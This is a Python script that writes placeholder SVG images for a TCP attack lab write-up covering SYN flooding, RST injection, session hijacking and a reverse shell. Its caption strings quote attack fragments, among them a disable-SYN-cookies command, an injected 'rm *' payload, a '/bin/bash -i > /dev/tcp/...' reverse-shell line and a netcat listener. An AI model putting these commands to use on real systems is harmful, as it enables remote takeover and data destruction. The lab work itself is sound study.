#!/usr/bin/env python3
"""
Screenshot Placeholder Generator
===================================
Generates placeholder SVG files for all expected screenshot locations.
Replace these with your actual lab screenshots.

Run this script once to populate the screenshots/ directory with
clearly labeled placeholders.

Usage:
    python3 docs/generate_placeholders.py
"""

import os

SCREENSHOTS = {
    "task1-syn-flood": [
        ("01-disable-syn-cookies.png",     "Disabling SYN cookies\nsysctl -w net.ipv4.tcp_syncookies=0\nBacklog size = 256"),
        ("02-python-script.png",           "Python SYN flood script\nScapy · 100 threads · Spoofed IPs"),
        ("03-attack-running.png",          "python3 synflood.py\nFlooding 10.9.0.5:23"),
        ("04-telnet-blocked.png",          "telnet 10.9.0.5\nTrying 10.9.0.5...\n[HANGS — backlog full]"),
        ("05-netstat-syn-recv.png",        "netstat -na\nRows of SYN_RECV entries\nAll spoofed IPs"),
        ("06-established-immune.png",      "Existing ESTABLISHED connections\nare unaffected by the flood"),
        ("07-c-source-code.png",           "C SYN flood source code\nRaw sockets · No OS TCP stack"),
        ("08-compile.png",                 "gcc -o synflood synflood.c\nCompiled successfully"),
        ("09-c-attack-running.png",        "synflood 10.9.0.5 23\nNative CPU speed flooding"),
        ("10-full-queue.png",              "netstat -na during C attack\nQueue instantly saturated"),
        ("11-connection-timeout.png",      "telnet: Unable to connect\nConnection timed out"),
        ("12-enable-syn-cookies.png",      "sysctl -w net.ipv4.tcp_syncookies=1\nDefense enabled"),
        ("13-flood-with-cookies.png",      "C flood still running\nSYN_RECV entries visible"),
        ("14-telnet-succeeds.png",         "telnet 10.9.0.5 → CONNECTED\nAttack neutralized!"),
    ],
    "task2-rst-attack": [
        ("01-live-telnet-session.png",     "Active Telnet session\n10.9.0.5 → 10.9.0.6\nLogged in as seed"),
        ("02-wireshark-seq-number.png",    "Wireshark capture\nSEQ=2261858712 extracted\nSrc Port: 23, Dst Port: 38462"),
        ("03-rst-script.png",             "tcprst.py script\nflags='R', seq=2261858733"),
        ("04-execute-rst.png",            "python3 tcprst.py\nFlags=<Flag 4 (R)>\nPacket sent"),
        ("05-session-killed.png",         "Connection closed by foreign host\nSession terminated!"),
    ],
    "task3-session-hijacking": [
        ("01-create-test-file.png",       "touch myfile.txt\nFile created on target"),
        ("02-active-session.png",         "Active Telnet session\n10.9.0.5 → 10.9.0.6"),
        ("03-wireshark-params.png",       "sport=39676\nseq=2537671292\nack=963565695"),
        ("04-hijack-script.png",          "tcpsessionhijack.py\npayload: '\\r rm *\\n\\r'"),
        ("05-execute-hijack.png",         "python3 tcpsessionhijack.py\nPayload b'\\r rm *\\n\\r' sent"),
        ("06-injection-wireshark.png",    "Wireshark: injected packet\n+ Spurious Retransmissions\n(session desynced)"),
        ("07-file-deleted.png",           "ll shows: total 0\nmyfile.txt DELETED\nHijack successful!"),
    ],
    "task4-reverse-shell": [
        ("01-new-telnet-session.png",     "New Telnet session\n10.9.0.5 → 10.9.0.6"),
        ("02-wireshark-params.png",       "sport=39714\nseq=1810434171\nack=9935746"),
        ("03-reverse-shell-script.png",   "tcpreverseshell.py\n/bin/bash -i > /dev/tcp/10.9.0.1/9090"),
        ("04-netcat-listener.png",        "nc -lv 9090\nListening on 0.0.0.0 9090"),
        ("05-send-payload.png",           "python3 tcpreverseshell.py\nPayload sent to victim"),
        ("06-shell-received.png",         "Connection received from 10.9.0.6!\nifconfig shows victim IP\nFULL SHELL ACCESS!"),
        ("07-full-capture.png",           "Wireshark: complete attack chain\nTelnet → inject → reverse TCP → shell"),
    ],
}

COLORS = {
    "task1-syn-flood":         ("#dc2626", "#fef2f2"),
    "task2-rst-attack":        ("#ea580c", "#fff7ed"),
    "task3-session-hijacking": ("#2563eb", "#eff6ff"),
    "task4-reverse-shell":     ("#16a34a", "#f0fdf4"),
}

SVG_TEMPLATE = """\
<svg width="800" height="400" viewBox="0 0 800 400" xmlns="http://www.w3.org/2000/svg">
  <rect width="800" height="400" fill="#0d1117"/>
  <rect x="0" y="0" width="5" height="400" fill="{accent}"/>
  <rect x="1" y="190" width="798" height="1" stroke="{accent}" stroke-width="0.5" opacity="0.3"/>

  <!-- Terminal header -->
  <rect x="0" y="0" width="800" height="32" fill="#161b22"/>
  <circle cx="18" cy="16" r="6" fill="#ff5f57"/>
  <circle cx="36" cy="16" r="6" fill="#ffbd2e"/>
  <circle cx="54" cy="16" r="6" fill="#28c840"/>
  <text x="400" y="20" font-family="'Courier New', monospace" font-size="11"
        fill="#8b949e" text-anchor="middle">{filename} — REPLACE WITH ACTUAL SCREENSHOT</text>

  <!-- Placeholder icon -->
  <text x="400" y="140" font-family="'Courier New', monospace" font-size="48"
        fill="{accent}" text-anchor="middle" opacity="0.4">📸</text>

  <!-- Main label -->
  <text x="400" y="200" font-family="'Courier New', monospace" font-size="16"
        fill="{accent}" text-anchor="middle" font-weight="bold">{title_line1}</text>
  <text x="400" y="224" font-family="'Courier New', monospace" font-size="14"
        fill="#8b949e" text-anchor="middle">{title_line2}</text>
  <text x="400" y="248" font-family="'Courier New', monospace" font-size="14"
        fill="#8b949e" text-anchor="middle">{title_line3}</text>

  <!-- Instruction -->
  <rect x="150" y="300" width="500" height="50" rx="4" fill="#21262d"/>
  <text x="400" y="320" font-family="'Courier New', monospace" font-size="11"
        fill="#f0883e" text-anchor="middle">⚠  PLACEHOLDER — Replace with actual screenshot</text>
  <text x="400" y="338" font-family="'Courier New', monospace" font-size="10"
        fill="#8b949e" text-anchor="middle">See README.md for screenshot placement guide</text>
</svg>"""


def create_placeholder(folder, filename, description):
    lines = description.split('\n') + ['', '', '']
    accent, _ = COLORS.get(folder, ("#6366f1", "#f0f9ff"))
    svg = SVG_TEMPLATE.format(
        filename=filename,
        accent=accent,
        title_line1=lines[0],
        title_line2=lines[1] if len(lines) > 1 else '',
        title_line3=lines[2] if len(lines) > 2 else '',
    )
    # Save as SVG (rename to .png after replacing with actual screenshots)
    svg_path = os.path.join("screenshots", folder,
                            filename.replace('.png', '_placeholder.svg'))
    os.makedirs(os.path.dirname(svg_path), exist_ok=True)
    with open(svg_path, 'w') as f:
        f.write(svg)
    print(f"  Created: {svg_path}")


if __name__ == "__main__":
    print("[*] Generating screenshot placeholders...\n")
    for folder, shots in SCREENSHOTS.items():
        print(f"[{folder}]")
        for filename, desc in shots:
            create_placeholder(folder, filename, desc)
    print("\n[✔] Done. Replace placeholders with actual screenshots from your lab.")
